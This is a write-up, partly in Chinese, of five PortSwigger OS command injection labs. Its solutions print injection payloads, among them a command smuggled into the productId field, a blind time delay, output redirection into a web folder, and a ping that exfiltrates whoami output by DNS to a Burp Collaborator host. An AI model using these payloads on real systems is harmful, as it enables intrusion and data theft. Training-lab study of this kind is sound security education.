# OS command injection
## [Lab: OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
### 題目敘述
This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the whoami command to determine the name of the current user. 
### 題目解釋
要執行 `whoami`，弱點在 stock checker
### 解答

Post 設定參數
```
productId=1%20%26%26%20whoami&storeId=3
```

## [Lab: Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
### 題目敘述
 This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay. 

### 題目解釋
弱點在 feedback 的地方，是 Blind 的，需要讓他 sleep 10 秒。

### 解答
Message 框框 
```
`sleep 10`
```
其他亂填

## [Lab: Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

### 題目敘述
 This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

/var/www/images/

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output. 

### 題目解釋
把 `whoami` 的結果導到可寫目錄 `/var/www/images/` 中

### 解答

留言板輸入
```
`whoami > /var/www/images/meow`
```

觀察圖片網址，修改檔名成我們的 `meow`

```
curl https://ac6d1f281ef7c882c02f097c005c00eb.web-security-academy.net/image?filename=meow
```

## [Lab: Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
### 題目敘述
 This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 

### 題目解釋
用 OOB 的方法來戳 DNS，這題也需要 Burp pro
### 解答
```
`ping -c 1 wmm426c5ur886whb24c3mdfj0a60up.burpcollaborator.net`
```

## [Lab: Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
### 題目敘述
 This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab. 
### 題目解釋
用 OOB 的方法帶 `whoami` 出來，一樣需要 Burp Pro。
### 解答
```
`ping -c 1 $(whoami).wmm426c5ur886whb24c3mdfj0a60up.burpcollaborator.net`
```

![](https://i.imgur.com/Ob79KWV.png)

可以看出使用者名稱叫做 `peter-bdv4Yq`

按上方的 submit solution 就可以提交答案

